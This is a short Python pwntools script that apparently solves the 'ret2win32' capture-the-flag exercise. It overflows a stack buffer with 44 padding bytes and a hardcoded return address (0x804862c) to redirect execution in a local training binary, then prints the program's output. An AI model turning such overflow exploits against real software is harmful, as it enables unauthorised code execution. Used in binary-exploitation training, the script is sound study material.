from pwn import *

padding = b'A'*44
add=p32(0x804862c)

payload = padding+add

p = process("./ret2win32")
print(p.recvuntil(b'> '))
print(p.sendline(payload))
print(p.recvline())
print(p.recvline())
print(p.recvline())
